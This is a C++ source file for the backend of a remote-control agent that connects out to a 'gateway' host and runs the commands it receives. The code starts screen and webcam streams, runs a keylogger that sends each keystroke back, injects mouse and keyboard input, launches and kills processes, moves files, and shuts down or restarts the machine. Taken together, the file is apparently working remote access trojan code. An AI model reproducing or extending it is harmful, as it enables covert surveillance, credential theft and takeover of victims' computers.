#include "core/BackendServer.hpp"
#include "core/BroadcastBus.hpp"
#include "core/StreamSession.hpp"
#include "interfaces/IVideoStreamer.hpp"
#include "interfaces/IKeylogger.hpp"
#include "interfaces/IAppManager.hpp"
#include "interfaces/IInputInjector.hpp"
#include "core/network/TcpSocket.hpp"
#include "core/network/PacketDispatcher.hpp"
#include "handlers/FileCommandHandler.hpp"
#include <cstring>
#include <iostream>
#include <algorithm>
#include <sstream>
#include <thread>
#include <chrono>

namespace core {

    BackendServer::BackendServer(
        std::string gateway_host,
        uint16_t port,
        std::shared_ptr<BroadcastBus> bus_monitor,
        std::shared_ptr<BroadcastBus> bus_webcam,
        std::shared_ptr<StreamSession> session,
        std::shared_ptr<StreamSession> webcam_session,
        std::shared_ptr<interfaces::IKeylogger> keylogger,
        std::shared_ptr<interfaces::IAppManager> app_manager,
        std::shared_ptr<interfaces::IInputInjector> input_injector,
        std::shared_ptr<interfaces::IFileTransfer> file_transfer
    ) : gateway_host_(gateway_host), gateway_port_(port), bus_monitor_(bus_monitor), bus_webcam_(bus_webcam), session_(session),
        webcam_session_(webcam_session), keylogger_(keylogger), app_manager_(app_manager),
        input_injector_(input_injector), file_transfer_(file_transfer) {

        // Initialize Command Dispatcher and Register Handlers
        dispatcher_ = std::make_unique<command::CommandDispatcher>();

        if (file_transfer_) {
            dispatcher_->register_handler(std::make_shared<handlers::FileCommandHandler>(*file_transfer_));
        }
    }

    BackendServer::~BackendServer() {
        stop();
    }

    void BackendServer::run() {
        running_ = true;
        std::cout << "[BackendServer] Agent Starting (Reverse Connection Model)..." << std::endl;

        while (running_) {
            std::cout << "[BackendServer] Connecting to Gateway at " << gateway_host_ << ":" << gateway_port_ << "..." << std::endl;
            socket_t fd = connect_to_gateway();

            if (IS_VALID_SOCKET(fd)) {
                std::cout << "[BackendServer] Connected to Gateway!" << std::endl;
                handle_connection(fd);
                std::cout << "[BackendServer] Disconnected from Gateway. Retrying in 5s..." << std::endl;
            } else {
                std::cout << "[BackendServer] Connection failed. Retrying in 5s..." << std::endl;
            }

            if (running_) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
            }
        }
    }

    socket_t BackendServer::connect_to_gateway() {
        socket_t fd = socket(AF_INET, SOCK_STREAM, 0);
        if (!IS_VALID_SOCKET(fd)) return INVALID_SOCKET;

        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;

        // Use configured Gateway Host
        addr.sin_addr.s_addr = inet_addr(gateway_host_.c_str());
        addr.sin_port = htons(gateway_port_);

        if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            CLOSE_SOCKET(fd);
            return INVALID_SOCKET;
        }

        return fd;
    }

    void BackendServer::stop() {
        running_ = false;
        // Logic to break the connect/handle loop is handled by checking running_ flag
        // Actual socket closure happens inside handle_connection when it errors out
    }

    void BackendServer::handle_connection(socket_t fd) {
        auto socket = std::make_shared<network::TcpSocket>(fd);
        socket->set_non_blocking(true);
        socket->set_no_delay(true);
        socket->set_send_buffer_size(256 * 1024);

        auto dispatcher = std::make_shared<network::PacketDispatcher>(socket);
        // A mutex to protect writes to the client socket
        auto client_mutex = std::make_shared<std::mutex>();

        static const int HEADER_SIZE = 12; // 4 bytes for len, 4 for cid, 4 for bid

        // New Sender: Priority based
        // is_critical=true: Loop until sent (Control messages)
        // is_critical=false: Drop if would block (Video frames)
        // FIXED: Now accepts explicit CID/BID to prevent Race Conditions in callbacks
        // Captured HEADER_SIZE explicitely (or by static const logic)
        auto sender = [this, fd, client_mutex](const std::vector<uint8_t>& data, uint8_t prefix, bool is_critical, uint32_t target_cid, uint32_t target_bid) {
            std::lock_guard<std::mutex> lock(*client_mutex);

            // Construct Packet
            uint32_t len = data.size() + (prefix != 0 ? 1 : 0);
            uint32_t net_len = htonl(len);
            uint32_t net_cid = htonl(target_cid);
            uint32_t net_bid = htonl(target_bid);

            uint8_t header[HEADER_SIZE];
            memcpy(header, &net_len, 4);
            memcpy(header+4, &net_cid, 4);
            memcpy(header+8, &net_bid, 4);

            // Helper to write all bytes
            auto write_all = [&](const uint8_t* ptr, size_t size) -> bool {
                size_t sent = 0;
                while(sent < size) {
                    ssize_t n = send(fd, (const SOCK_BUF_TYPE)(ptr + sent), size - sent, 0);
                    if (n < 0) {
                        #ifdef _WIN32
                        int err = WSAGetLastError();
                        if (err == WSAEWOULDBLOCK) {
                        #else
                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
                        #endif
                            if (!is_critical) {
                                // Real-time packet: Drop immediately on congestion
                                return false;
                            }
                            // Critical packet: Wait and retry
                            std::this_thread::sleep_for(std::chrono::milliseconds(1));
                            continue;
                        }
                        return false; // Fatal error
                    }
                    sent += n;
                }
                return true;
            };

            // Send Header
            if (!write_all(header, HEADER_SIZE)) return;
            // Send Prefix
            if (prefix != 0) {
                if (!write_all(&prefix, 1)) return;
            }
            // Send Payload
            write_all(data.data(), data.size());
        };

        auto send_text = [&](const std::string& msg, uint32_t t_cid, uint32_t t_bid) {
            std::vector<uint8_t> b(msg.begin(), msg.end());
            sender(b, 0, true, t_cid, t_bid); // Critical
        };

        // --- READ HANDLER (LEGACY) ---
        // This lambda now encapsulates the full read logic for a single packet
        auto read_frame = [&](socket_t sock_fd, std::vector<uint8_t>& out_payload, uint32_t& out_cid, uint32_t& out_bid) -> bool {
            uint8_t header[HEADER_SIZE];
            size_t got = 0;
            while(got < HEADER_SIZE) {
                auto [n, err] = socket->recv(header + got, HEADER_SIZE - got);
                if (n > 0) got += n;
                else if (err == network::SocketError::WouldBlock) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(1));
                    continue;
                }
                else return false; // Error or connection closed
            }

            uint32_t net_len; memcpy(&net_len, header, 4);
            uint32_t len = ntohl(net_len);
            uint32_t net_cid; memcpy(&net_cid, header+4, 4);
            out_cid = ntohl(net_cid);
            uint32_t net_bid; memcpy(&net_bid, header+8, 4);
            out_bid = ntohl(net_bid);

            if (len > 10 * 1024 * 1024) return false; // Prevent huge allocations

            out_payload.resize(len);
            if(len > 0) {
                got = 0;
                while(got < len) {
                    auto [n, err] = socket->recv(out_payload.data() + got, len - got);
                    if (n > 0) got += n;
                    else if (err == network::SocketError::WouldBlock) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(1));
                        continue;
                    }
                    else return false; // Error or connection closed
                }
            }
            return true;
        };

        uint32_t cid = 0;
        uint32_t bid = 0; // Capture BID for echo
        std::vector<uint8_t> payload;

        uint32_t my_backend_id = 1; // Default to 1

        while (true) {
            if (!read_frame(fd, payload, cid, bid)) break;

            if (bid != 0) {
                my_backend_id = bid;
            }
            if (my_backend_id == 0) my_backend_id = 1; // Fallback default

            std::string msg(payload.begin(), payload.end());
            msg.erase(std::find(msg.begin(), msg.end(), '\0'), msg.end());

            if (msg.find("mouse_move") == std::string::npos) {
                std::cout << "[CMD] " << msg << " [CID=" << cid << "]" << std::endl;
            }

            std::stringstream ss(msg);
            std::string cmd; ss >> cmd;

            // Dispatch File Commands through the CommandDispatcher
            if (cmd.rfind("file_", 0) == 0) {
                if (dispatcher_) {
                    core::command::CommandContext ctx;
                    ctx.client_id = cid;
                    ctx.backend_id = my_backend_id;
                    // Create a responder that wraps the local sender lambda
                    ctx.respond = [sender, cid, my_backend_id](std::vector<uint8_t>&& d, bool c) {
                        sender(d, 0, c, cid, my_backend_id);
                    };

                    dispatcher_->dispatch(msg, ctx);
                }
                continue; // Skip legacy handling
            }

            if (cmd == "ping") {
                 send_text("INFO:NAME=CoreAgent", cid, my_backend_id);
            }
            else if (cmd == "start_monitor_stream") {
                 uint32_t sub_cid = cid;
                 uint32_t sub_bid = my_backend_id;

                 bus_monitor_->subscribe(sub_cid, [sender, sub_cid, sub_bid](const std::vector<uint8_t>& d){
                    sender(d, 1, false, sub_cid, sub_bid);
                 });

                 auto res = session_->start();
                 if(res.is_err() && res.error().code != common::ErrorCode::Busy) send_text("ERROR:StartStream:" + res.error().message, cid, my_backend_id);
                 else send_text("STATUS:MONITOR_STREAM:STARTED", cid, my_backend_id);
            }
            else if (cmd == "stop_monitor_stream") {
                 bus_monitor_->unsubscribe(cid);
                 session_->stop();
                 send_text("STATUS:MONITOR_STREAM:STOPPED", cid, my_backend_id);
            }
            else if (cmd == "start_webcam_stream") {
               uint32_t sub_cid = cid;
               uint32_t sub_bid = my_backend_id;
               bus_webcam_->subscribe(sub_cid, [sender, sub_cid, sub_bid](const std::vector<uint8_t>& d){
                   sender(d, 2, false, sub_cid, sub_bid);
               });
               webcam_session_->start();
               send_text("STATUS:WEBCAM_STREAM:STARTED", cid, my_backend_id);
            }
            else if (cmd == "stop_webcam_stream") {
                bus_webcam_->unsubscribe(cid);
                webcam_session_->stop();
                send_text("STATUS:WEBCAM_STREAM:STOPPED", cid, my_backend_id);
            }
            else if (cmd == "start_keylog") {
                uint32_t sub_cid = cid;
                uint32_t sub_bid = my_backend_id;

                auto res = keylogger_->start([sender, sub_cid, sub_bid](const interfaces::KeyEvent& k){
                    std::string s = "KEYLOG: " + k.text;
                    std::vector<uint8_t> b(s.begin(), s.end());
                    sender(b, 0, true, sub_cid, sub_bid);
                });
                if(res.is_err()) send_text("ERROR:Keylog:" + res.error().message, cid, my_backend_id);
                else send_text("STATUS:KEYLOGGER:STARTED", cid, my_backend_id);
            }
            else if (cmd == "stop_keylog") {
                keylogger_->stop();
                send_text("STATUS:KEYLOGGER:STOPPED", cid, my_backend_id);
            }
            else if (cmd == "list_apps" || cmd == "get_apps") {
                auto apps = app_manager_->list_applications(false);
                std::string res = "DATA:APPS:";
                for(size_t i=0; i<apps.size(); ++i) {
                     const auto& a = apps[i];
                     if(i > 0) res += ";";
                     res += a.id + "|" + a.name + "|" + a.icon + "|" + a.exec + "|" + a.keywords;
                }
                send_text(res, cid, my_backend_id);
            }
            else if (cmd == "list_process") {
                auto procs = app_manager_->list_applications(true); // true = running processes
                std::string res = "DATA:PROCS:";
                for(size_t i=0; i<procs.size(); ++i) {
                     const auto& p = procs[i];
                     if(i > 0) res += ";";
                     // Format: PID|Name|Icon|Exec|Keywords (reusing AppEntry structure)
                     res += std::to_string(p.pid) + "|" + p.name + "|-|" + p.exec + "|Running";
                }
                send_text(res, cid, my_backend_id);
            }
            else if (cmd == "launch_app") {
                std::string args;
                if (msg.size() > 11) args = msg.substr(11);
                auto res = app_manager_->launch_app(args);
                if(res.is_ok()) send_text("STATUS:APP_LAUNCHED:" + std::to_string(res.unwrap()), cid, my_backend_id);
                else send_text("ERROR:Launch:" + res.error().message, cid, my_backend_id);
            }
            else if (cmd == "mouse_move") {
                float x, y; ss >> x >> y;
                if(input_injector_) input_injector_->move_mouse(x, y);
            }
            else if (cmd == "mouse_down") {
                 int btn; ss >> btn;
                 if(input_injector_) input_injector_->click_mouse((interfaces::MouseButton)btn, true);
            }
            else if (cmd == "mouse_up") {
                 int btn; ss >> btn;
                 if(input_injector_) input_injector_->click_mouse((interfaces::MouseButton)btn, false);
            }
            else if (cmd == "mouse_click") {
                 int btn; ss >> btn;
                  if(input_injector_) {
                     input_injector_->click_mouse((interfaces::MouseButton)btn, true);
                     std::this_thread::sleep_for(std::chrono::milliseconds(20));
                     input_injector_->click_mouse((interfaces::MouseButton)btn, false);
                 }
            }
            else if (cmd == "mouse_scroll") {
                int delta; ss >> delta;
                if(input_injector_) input_injector_->scroll_mouse(delta);
            }
            else if (cmd == "key_down") {
                int code; ss >> code;
                if(input_injector_) input_injector_->press_key(static_cast<interfaces::KeyCode>(code), true);
            }
            else if (cmd == "key_up") {
                int code; ss >> code;
                if(input_injector_) input_injector_->press_key(static_cast<interfaces::KeyCode>(code), false);
            }
            else if (cmd == "text_input") {
                std::string text;
                if(ss.peek() == ' ') ss.ignore();
                std::getline(ss, text);
                if(input_injector_) input_injector_->send_text(text);
            }
            else if (cmd == "kill_process") {
                 uint32_t pid; ss >> pid;
                 app_manager_->kill_process(pid);
                 send_text("STATUS:PROCESS_KILLED", cid, my_backend_id);
            }
            else if (cmd == "search_apps") {
                std::string query;
                if(msg.size() > 12) query = msg.substr(12);
                auto apps = app_manager_->search_apps(query);
                std::string res = "DATA:APPS:";
                for(size_t i=0; i<apps.size(); ++i) {
                     if(i > 0) res += ";";
                     res += apps[i].id + "|" + apps[i].name + "|" + apps[i].icon + "|" + apps[i].exec + "|" + apps[i].keywords;
                }
                send_text(res, cid, my_backend_id);
            }
            else if(cmd == "shutdown") {
                send_text("INFO:System Shutdown Initiated", cid, my_backend_id);
                app_manager_->shutdown_system();
            }
            else if(cmd == "restart") {
                send_text("INFO:System Restart Initiated", cid, my_backend_id);
                app_manager_->restart_system();
            }
            else if (cmd == "get_state") {
                 // Report actual state of each feature
                 if(session_->is_active())
                     send_text("STATUS:SYNC:monitor=active", cid, my_backend_id);
                 else
                     send_text("STATUS:SYNC:monitor=inactive", cid, my_backend_id);

                 if(webcam_session_->is_active())
                     send_text("STATUS:SYNC:webcam=active", cid, my_backend_id);
                 else
                     send_text("STATUS:SYNC:webcam=inactive", cid, my_backend_id);

                 if(keylogger_->is_active())
                     send_text("STATUS:SYNC:keylogger=active", cid, my_backend_id);
                 else
                     send_text("STATUS:SYNC:keylogger=inactive", cid, my_backend_id);

                 send_text("STATUS:SYNC:complete", cid, my_backend_id);
            }
            else {
                if(cmd.length() > 0) std::cout << "[CMD] " << cmd << std::endl;
            }
        }

        bus_monitor_->unsubscribe(cid);
        bus_webcam_->unsubscribe(cid);
    }

    // Deprecated methods
    bool BackendServer::read_frame(socket_t, std::vector<uint8_t>&, uint32_t&, uint32_t&) { return false; }
    bool BackendServer::send_frame(socket_t, const uint8_t*, uint32_t, uint32_t, uint32_t) { return false; }

} // namespace core
